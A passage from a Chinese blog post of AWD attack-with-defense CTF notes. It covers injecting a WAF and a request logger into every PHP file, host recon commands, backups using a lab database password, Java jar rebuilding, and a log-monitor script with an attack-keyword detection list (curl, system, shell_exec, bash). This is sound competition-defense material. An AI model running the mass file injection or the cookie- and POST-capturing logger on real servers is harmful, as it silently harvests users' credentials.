    <span class="token keyword">if</span> <span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token punctuation">\</span>$pattern, <span class="token punctuation">\</span>$param<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">||</span> strpos<span class="token punctuation">(</span><span class="token punctuation">\</span>$param, <span class="token punctuation">\</span>"<span class="token punctuation">\</span><span class="token variable">`</span></span><span class="token entity" title="\&quot;">\"</span>) !== false) &#123;
        die('flag&#123;You shall die!&#125;');
    &#125;
&#125;
?>"</span>

<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token parameter variable">-f</span> <span class="token string">"RCEw4f.php"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
    <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$waf</span>"</span> <span class="token operator">></span> <span class="token string">"RCEw4f.php"</span>
    <span class="token function">find</span> <span class="token string">"<span class="token variable">$webapp</span>"</span> <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> <span class="token string">"*.php"</span> <span class="token parameter variable">-exec</span> <span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">"s/&lt;?php/&lt;?php require_once('<span class="token variable">$webapp</span>\/RCEw4f.php');/g"</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> +
<span class="token keyword">else</span>
    <span class="token builtin class-name">echo</span> <span class="token string">"已上waf"</span>
<span class="token keyword">fi</span>
<span class="token builtin class-name">echo</span>
<span class="token comment">##############################################</span>
<span class="token builtin class-name">echo</span> <span class="token string">"上监控..."</span>
<span class="token assign-left variable">Monitor</span><span class="token operator">=</span><span class="token string">"&lt;?php
\<span class="token variable">$ip</span> = \<span class="token variable">$_SERVER</span>[<span class="token entity" title="\&quot;">\"</span>REMOTE_ADDR<span class="token entity" title="\&quot;">\"</span>];
\<span class="token variable">$filename</span> = \<span class="token variable">$_SERVER</span>['PHP_SELF'];
\<span class="token variable">$parameter</span> = \<span class="token variable">$_SERVER</span>[<span class="token entity" title="\&quot;">\"</span>QUERY_STRING<span class="token entity" title="\&quot;">\"</span>];
\<span class="token variable">$method</span> = \<span class="token variable">$_SERVER</span>['REQUEST_METHOD'];
\<span class="token variable">$uri</span> = \<span class="token variable">$_SERVER</span>['REQUEST_URI'];
\<span class="token variable">$time</span> = date('Y-m-d H:i:s', time());
\<span class="token variable">$post</span> = file_get_contents(<span class="token entity" title="\&quot;">\"</span>php://input<span class="token entity" title="\&quot;">\"</span>, 'r');
\<span class="token variable">$others</span> = '...其他你想得到的信息...';
\<span class="token variable">$logadd</span> = 'Visit Time：'.\<span class="token variable">$time</span>.' '.'Visit IP：'.\<span class="token variable">$ip</span>.<span class="token entity" title="\&quot;">\"</span><span class="token entity" title="\\">\\</span>r<span class="token entity" title="\\">\\</span>n<span class="token entity" title="\&quot;">\"</span>.'RequestURI：'.\<span class="token variable">$uri</span>.' '.\<span class="token variable">$parameter</span>.'RequestMethod：'.\<span class="token variable">$method</span>.<span class="token entity" title="\&quot;">\"</span><span class="token entity" title="\\">\\</span>r<span class="token entity" title="\\">\\</span>n<span class="token entity" title="\&quot;">\"</span>;
\<span class="token variable">$fh</span> = fopen(<span class="token entity" title="\&quot;">\"</span>/tmp/log.txt<span class="token entity" title="\&quot;">\"</span>, <span class="token entity" title="\&quot;">\"</span>a+<span class="token entity" title="\&quot;">\"</span>);
fwrite(\<span class="token variable">$fh</span>, \<span class="token variable">$logadd</span>);
fwrite(\<span class="token variable">$fh</span>, print_r(\<span class="token variable">$_COOKIE</span>, true).<span class="token entity" title="\&quot;">\"</span><span class="token entity" title="\\">\\</span>r<span class="token entity" title="\\">\\</span>n<span class="token entity" title="\&quot;">\"</span>);
fwrite(\<span class="token variable">$fh</span>, \<span class="token variable">$post</span>.<span class="token entity" title="\&quot;">\"</span><span class="token entity" title="\\">\\</span>r<span class="token entity" title="\\">\\</span>n<span class="token entity" title="\&quot;">\"</span>);
fwrite(\<span class="token variable">$fh</span>, \<span class="token variable">$others</span>.<span class="token entity" title="\&quot;">\"</span><span class="token entity" title="\\">\\</span>r<span class="token entity" title="\\">\\</span>n<span class="token entity" title="\&quot;">\"</span>);
fclose(\<span class="token variable">$fh</span>);
?>"</span>

<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token parameter variable">-f</span> <span class="token string">"phpMonitor.php"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
    <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$Monitor</span>"</span> <span class="token operator">></span> phpMonitor.php
    <span class="token function">find</span> <span class="token string">"<span class="token variable">$webapp</span>"</span> <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> <span class="token string">"*.php"</span> <span class="token parameter variable">-exec</span> <span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">"s/&lt;?php/&lt;?php require_once('<span class="token variable">$webapp</span>\/phpMonitor.php');/g"</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> +
<span class="token keyword">else</span>
    <span class="token builtin class-name">echo</span> <span class="token string">"已上监控"</span>
<span class="token keyword">fi</span>
<span class="token builtin class-name">echo</span>
<span class="token comment">##############################################</span>
<span class="token builtin class-name">echo</span> <span class="token string">"进程信息："</span>
<span class="token function">ps</span> <span class="token parameter variable">-aux</span> <span class="token comment">#| grep 'www-data'</span>
<span class="token builtin class-name">echo</span>

<span class="token builtin class-name">echo</span> <span class="token string">"可写目录检查："</span>
<span class="token function">find</span> / <span class="token parameter variable">-type</span> d <span class="token parameter variable">-perm</span> <span class="token parameter variable">-002</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
<span class="token builtin class-name">echo</span>
<span class="token comment">##############################################</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h2 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">uname</span> <span class="token parameter variable">-a</span>  <span class="token comment">#系统信息</span>
<span class="token function">ps</span> <span class="token parameter variable">-aux</span> <span class="token parameter variable">-ps</span> <span class="token parameter variable">-ef</span> <span class="token comment">#进程信息</span>
<span class="token function">id</span>   <span class="token comment">#用于显示用户ID，以及所属群组ID</span>
<span class="token function">netstat</span> -ano/-a <span class="token comment">#查看端口情况</span>
<span class="token function">cat</span> /etc/passwd <span class="token comment">#用户情况</span>
<span class="token function">ls</span> /home/ <span class="token comment">#用户情况</span>
<span class="token function">find</span> / <span class="token parameter variable">-type</span> d <span class="token parameter variable">-perm</span> <span class="token parameter variable">-002</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token comment">#可写目录检查</span>
<span class="token function">grep</span> <span class="token parameter variable">-r</span> “flag” /var/www/html/  <span class="token comment">#查找flag</span>
php <span class="token parameter variable">-i</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"php.ini"</span> <span class="token comment">#查php配置文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h2 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h2><h3 id="源码备份"><a href="#源码备份" class="headerlink" title="源码备份"></a>源码备份</h3><p>网站源码打包（路径视具体情况确定）：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> <span class="token parameter variable">-cvf</span> web.tar /var/www/html
<span class="token function">zip</span> <span class="token parameter variable">-q</span> <span class="token parameter variable">-r</span> web.zip /var/www/html
<span class="token function">tar</span> <span class="token parameter variable">-cvf</span> /tmp/web.tar.gz /opt/tomcat/webapps/ <span class="token comment">#java tomcat</span>
<span class="token function">tar</span> <span class="token parameter variable">-cvf</span> /tmp/web.tar /app<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2024/03/02/%E5%85%B3%E4%BA%8EAWD%E7%9A%84%E4%B8%80%E7%82%B9%E8%AE%B0%E5%BD%95/image-20240412204345701.png" alt="image-20240412204345701"></p>
<p>备份到其它位置</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mv</span> web.tar /tmp
<span class="token function">mv</span> web.zip /home/xxx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>文件上传、下载（其实直接用Xshell这种就可以直接上传下载）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">scp</span> username@servername:/path/filename /tmp/local_destination <span class="token comment">#从服务器下载单个文件到本地</span>
<span class="token function">scp</span> /path/local_filename username@servername:/path  <span class="token comment">#从本地上传单个文件到服务器</span>
<span class="token function">scp</span> <span class="token parameter variable">-r</span> username@servername:remote_dir/ /tmp/local_dir <span class="token comment">#从服务器下载整个目录到本地</span>
<span class="token function">scp</span> <span class="token parameter variable">-r</span> /tmp/local_dir username@servername:remote_dir <span class="token comment">#从本地上传整个目录到服务器</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>检查备份：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> /var/www/html/ <span class="token parameter variable">-name</span> <span class="token string">"*.tar"</span>
<span class="token function">find</span> /var/www/html/ <span class="token parameter variable">-name</span> <span class="token string">"*.zip"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/blog/2024/03/02/%E5%85%B3%E4%BA%8EAWD%E7%9A%84%E4%B8%80%E7%82%B9%E8%AE%B0%E5%BD%95/image-20240412205023769.png" alt="image-20240412205023769"></p>
<hr>
<h3 id="数据库备份"><a href="#数据库备份" class="headerlink" title="数据库备份"></a>数据库备份</h3><p>数据库配置信息一般可以通过如 config.php&#x2F;web.conf 等文件获取，以MySQL为例</p>
<p><img src="/blog/2024/03/02/%E5%85%B3%E4%BA%8EAWD%E7%9A%84%E4%B8%80%E7%82%B9%E8%AE%B0%E5%BD%95/image-20240412205528638.png" alt="image-20240412205528638"></p>
<p>备份指定数据库</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysqldump <span class="token parameter variable">-uroot</span> <span class="token parameter variable">-p334cc35b3c704593</span> databasename <span class="token operator">></span> bak.sql<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2024/03/02/%E5%85%B3%E4%BA%8EAWD%E7%9A%84%E4%B8%80%E7%82%B9%E8%AE%B0%E5%BD%95/image-20240412210118870.png" alt="image-20240412210118870"></p>
<p>备份所有数据库</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysqldump <span class="token parameter variable">-uroot</span> <span class="token parameter variable">-p334cc35b3c704593</span> --all-databases <span class="token operator">></span> bak.sql<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2024/03/02/%E5%85%B3%E4%BA%8EAWD%E7%9A%84%E4%B8%80%E7%82%B9%E8%AE%B0%E5%BD%95/image-20240412210629690.png" alt="image-20240412210629690"></p>
<p>导入数据库</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql <span class="token parameter variable">-uroot</span> <span class="token parameter variable">-p334cc35b3c704593</span> databasename <span class="token operator">&lt;</span> bak.sql<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>数据库登录</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql <span class="token parameter variable">-udb_user</span> <span class="token parameter variable">-pdb_passwd</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>数据库操作：</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">create database db_name;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h2 id="恢复-amp-源码更新"><a href="#恢复-amp-源码更新" class="headerlink" title="恢复&amp;源码更新"></a>恢复&amp;源码更新</h2><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> <span class="token parameter variable">-xvf</span> web.tar <span class="token parameter variable">-C</span> /var/www/html
<span class="token function">unzip</span> web.zip <span class="token parameter variable">-d</span> /var/www/html <span class="token comment">#如果有unzip</span>

<span class="token function">cp</span> /tmp/xxx.php /var/www/html/xxx.php <span class="token operator">&amp;&amp;</span> <span class="token function">chmod</span> <span class="token number">777</span> /var/www/html/xxx.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><p>java的web程序运行通常都是使用jar包和war包来运行的，通常情况下的运行指令为：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> awd.jar
<span class="token function">java</span> <span class="token parameter variable">-war</span> awd.war<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>jar包（war包也一样）本质是一种压缩文件，里面包含了从java编译到class的java文件已经程序运行的常规文件，是可以直接使用zip解压得到里面的内容，不过由于java已经编译了，所以需要工具&#x2F;方法进行反序列化操作，得到原本的文件后我们才方便后面的操作</p>
<p>反编译的操作这里就不多提了，jdgui，jadx，IDEA都可以做到</p>
<p>反编译的文件组成：</p>
<ul>
<li>META-INF（war包里是WEB-INF）：文件的元数据，里面存放的是pom.xml文件和jar包的描述文件，对我们来说取出pom文件就可以了</li>
<li>BOOT-INF：这个文件夹是存放主要的java文件的，里面包含java的配置文件和源码文件。其中 classes 文件夹是包含源码文件配置文件的，lib 文件夹存放依赖文件，classpath.idx 是用来指明 classpath 的，我们需要将classes中的 <strong>com</strong> 文件夹放到项目文件的java文件夹中，其他文件放到 <strong>resources</strong> 文件夹中</li>
<li>org：spring boot的驱动文件</li>
</ul>
<h4 id="构建项目"><a href="#构建项目" class="headerlink" title="构建项目"></a>构建项目</h4><p>在AWD中需要修补漏洞，这时候就需要将代码重新生成成一个完整的java项目，然后进行找洞，补洞</p>
<p>这里只需要创建一个简单的maven项目，将之前的反编译后得到的pom.xml（位于META-INF中）替换进去，然后将我们反编译后java文件和其他文件放到其中即可</p>
<p>src下的目录：</p>
<ul>
<li>lib：java中需要的依赖文件</li>
<li>main<ul>
<li>java：java源码</li>
<li>resources：java源码中的配置或者网站静态资源</li>
</ul>
</li>
</ul>
<hr>
<h4 id="重新打包"><a href="#重新打包" class="headerlink" title="重新打包"></a>重新打包</h4><p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://natro92.fun/posts/82174079/">https://natro92.fun/posts/82174079/</a></p>
<p><a target="_blank" rel="noopener" href="https://jlkl.github.io/2024/07/23/Java-11/">https://jlkl.github.io/2024/07/23/Java-11/</a></p>
<p><strong>推荐直接用 IDEA 插件 JarEditor 修改jar包</strong></p>
<p>maven打包：maven直接有打包的操作，需要在pom.xml中写入打包类型是jar还是war，然后就可以通过package进行打包，在IDEA中直接点击即可，然后就可以在target中找到所打包的jar包了</p>
<p>IDEA打包：</p>
<p>在idea的<code>项目结构</code> 中选择 <code>工件</code>然后选择新建一个jar包，之后选择<code>具有依赖的模块</code></p>
<p>然后选择文件，选择主类，之后是选择生成 META-INFO 的位置（测试的时候发现，修改到src目录，可以打包进jar中，不然最后的结果都是没有META文件报错）</p>
<p>选择完路径后点击确定退出即可，然后选择<code>构建</code>，<code>构建工件</code>，<code>构建</code>即可在out中找到jar包（默认的话）</p>
<hr>
<h4 id="更新靶机源码"><a href="#更新靶机源码" class="headerlink" title="更新靶机源码"></a>更新靶机源码</h4><p>上传，解压jar&#x2F;war后在对应的xxx.class目录下</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">javac <span class="token parameter variable">-cp</span> C:<span class="token punctuation">..</span>.<span class="token punctuation">\</span>lib<span class="token punctuation">;</span>C:<span class="token punctuation">..</span>.<span class="token punctuation">\</span>lib-provided xxx.java<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li><p>支持热加载.class：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> xxx.class /opt/tomcat/webapps/WEB-INF/classes/com/<span class="token punctuation">..</span>./<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>不支持热加载（如以jar包启动的话）：</p>
<p>用bandzip打开jar直接替换里面的.class文件，把靶机上的jar替换掉，kill掉现有进程重新启动（要记录原有的启动命令，<code>ps -aux|grep jar或者cat /proc/&#123;PID&#125;/cmdline</code>）</p>
</li>
</ul>
<hr>
<h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><p>mysql命令行下操作：</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">use db_name;
source &#x2F;tmp&#x2F;bak.sql<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql <span class="token parameter variable">-udb_user</span> <span class="token parameter variable">-pdb_passwd</span> db_name<span class="token operator">&lt;</span> /tmp/bak.sql<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h2 id="修改口令"><a href="#修改口令" class="headerlink" title="修改口令"></a>修改口令</h2><p>ssh口令修改：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">passwd</span> username<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2024/03/02/%E5%85%B3%E4%BA%8EAWD%E7%9A%84%E4%B8%80%E7%82%B9%E8%AE%B0%E5%BD%95/image-20240412212255252.png" alt="image-20240412212255252"></p>
<p>MySQL数据库密码修改：</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">set password for mycms@localhost &#x3D; password(&#39;123&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysqladmin <span class="token parameter variable">-uroot</span> <span class="token parameter variable">-ppassword</span> <span class="token string">''</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>修改完数据库密码记得也要修改网站配置文件中的数据库配置信息</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> /var/www/html <span class="token parameter variable">-path</span> <span class="token string">'*config*'</span>  <span class="token comment">#查找配置文件中的密码凭证</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2024/03/02/%E5%85%B3%E4%BA%8EAWD%E7%9A%84%E4%B8%80%E7%82%B9%E8%AE%B0%E5%BD%95/image-20240412212359569.png" alt="image-20240412212359569"></p>
<p>网站后台的口令也要记得修改</p>
<hr>
<h2 id="应用发现"><a href="#应用发现" class="headerlink" title="应用发现"></a>应用发现</h2><p>服务</p>
<p>寻找自身是 nginx 还是 apache 搭建的，并寻找出目录</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-name</span> <span class="token string">"nginx.conf"</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null     <span class="token comment">#定位nginx目录</span>
<span class="token function">find</span> / <span class="token parameter variable">-path</span> <span class="token string">"*nginx*"</span> <span class="token parameter variable">-name</span> nginx*conf   <span class="token comment">#定位nginx配置目录</span>
<span class="token function">find</span> / <span class="token parameter variable">-name</span> <span class="token string">"httpd.conf"</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null     <span class="token comment">#定位apache目录</span>
<span class="token function">find</span> / <span class="token parameter variable">-path</span> <span class="token string">"*apache*"</span> <span class="token parameter variable">-name</span> apache*conf <span class="token comment">#定位apache配置目录</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>网站</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-name</span> <span class="token string">"index.php"</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
<span class="token function">find</span> / <span class="token parameter variable">-iname</span> tomcat <span class="token comment">#找java网站目录</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/blog/2024/03/02/%E5%85%B3%E4%BA%8EAWD%E7%9A%84%E4%B8%80%E7%82%B9%E8%AE%B0%E5%BD%95/image-20240412212814301.png" alt="image-20240412212814301"></p>
<p>日志</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/var/log/nginx/    <span class="token comment">#默认Nginx日志目录</span>
/var/log/apache/   <span class="token comment">#默认Apache日志目录</span>
/var/log/apache2/  <span class="token comment">#默认Apache日志目录</span>
/usr/local/apache2/logs <span class="token comment">#可能Apache日志目录</span>
/usr/local/tomcat/logs <span class="token comment">#Tomcat日志目录</span>
<span class="token function">tail</span> <span class="token parameter variable">-f</span> xxx.log   <span class="token comment">#实时刷新滚动日志文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>查看访问量前十的链接：（本地测试的时候发现没权限）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /var/log/apache2/access.log <span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'&#123;print $7&#125;'</span><span class="token operator">|</span><span class="token function">sort</span><span class="token operator">|</span><span class="token function">uniq</span> -c<span class="token operator">|</span> <span class="token function">sort</span> -r<span class="token operator">|</span><span class="token function">head</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h1 id="监控"><a href="#监控" class="headerlink" title="监控"></a>监控</h1><p>awd里最有用的部分，不会打？别人的流量教你打！</p>
<h2 id="日志监控（Failed）"><a href="#日志监控（Failed）" class="headerlink" title="日志监控（Failed）"></a>日志监控（Failed）</h2><p>这个脚本需要装pyinotify库，不通外网的环境下应该装不了</p>
<p>可将其使用<code>pyinstaller</code>打包为elf执行，但是实际情况还要考虑到靶机的glibc版本是否匹配。。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#coding=utf-8</span>
<span class="token comment">##Author: 7i4n2h3n9 &amp; EDS</span>
<span class="token comment">##Team: Polar Day Cyberspace Security LAB</span>

<span class="token keyword">import</span> os
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> re
<span class="token keyword">import</span> pyinotify

<span class="token comment"># Set Log Path</span>
<span class="token keyword">def</span> <span class="token function">setHttpserver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Please set the log path of HTTPserver'</span><span class="token punctuation">)</span>
    logDir <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'Please input the path:'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span>logDir<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> logDir
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'File does not exist!'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Exit the program......'</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit

<span class="token keyword">class</span> <span class="token class-name">EventHandler</span><span class="token punctuation">(</span>pyinotify<span class="token punctuation">.</span>ProcessEvent<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> file_path<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token builtin">super</span><span class="token punctuation">(</span>EventHandler<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>file_path <span class="token operator">=</span> file_path
        self<span class="token punctuation">.</span>_last_position <span class="token operator">=</span> <span class="token number">0</span>
        logpats <span class="token operator">=</span> <span class="token string">r'((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;)(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;))&#123;3&#125;'</span>
        self<span class="token punctuation">.</span>_logpat <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span>logpats<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">process_IN_MODIFY</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> event<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment">#print("File changed: " + event.pathname)</span>
        <span class="token keyword">if</span> self<span class="token punctuation">.</span>_last_position <span class="token operator">></span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>getsize<span class="token punctuation">(</span>self<span class="token punctuation">.</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>_last_position <span class="token operator">=</span> <span class="token number">0</span>
        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>file_path<span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
            f<span class="token punctuation">.</span>seek<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_last_position<span class="token punctuation">)</span>
            loglines <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>_last_position <span class="token operator">=</span> f<span class="token punctuation">.</span>tell<span class="token punctuation">(</span><span class="token punctuation">)</span>
            groups <span class="token operator">=</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>_logpat<span class="token punctuation">.</span>search<span class="token punctuation">(</span>line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> line <span class="token keyword">in</span> loglines<span class="token punctuation">)</span>
            <span class="token keyword">for</span> g <span class="token keyword">in</span> groups<span class="token punctuation">:</span>
                <span class="token keyword">if</span> check_Log<span class="token punctuation">(</span>g<span class="token punctuation">.</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span>g<span class="token punctuation">.</span>string<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">check_Log</span><span class="token punctuation">(</span>strLog<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'union|eval|alert|update|insert|into|from|create|delete|drop|truncate|rename|desc|charset|ascii|bin|char|uncompress|concat|concat_ws|conv|export_set|hex|instr|left|load_file|locate|sub|substring|oct|reverse|right|unhex|prompt|fwrite|curl|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore|whoami|bash|phpinfo|msgbox|select|ord|mid|group|and|flag'</span><span class="token punctuation">,</span>strLog<span class="token punctuation">,</span>re<span class="token punctuation">.</span>I<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">True</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>

<span class="token keyword">def</span> <span class="token function">LogMonitor</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>
    wm <span class="token operator">=</span> pyinotify<span class="token punctuation">.</span>WatchManager<span class="token punctuation">(</span><span class="token punctuation">)</span>
    mask <span class="token operator">=</span> pyinotify<span class="token punctuation">.</span>IN_MODIFY
    handler <span class="token operator">=</span> EventHandler<span class="token punctuation">(</span>path<span class="token punctuation">)</span>
    notifier <span class="token operator">=</span> pyinotify<span class="token punctuation">.</span>Notifier<span class="token punctuation">(</span>wm<span class="token punctuation">,</span> handler<span class="token punctuation">)</span>
    wm<span class="token punctuation">.</span>add_watch<span class="token punctuation">(</span>handler<span class="token punctuation">.</span>file_path<span class="token punctuation">,</span> mask<span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Now Starting Monitor %s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
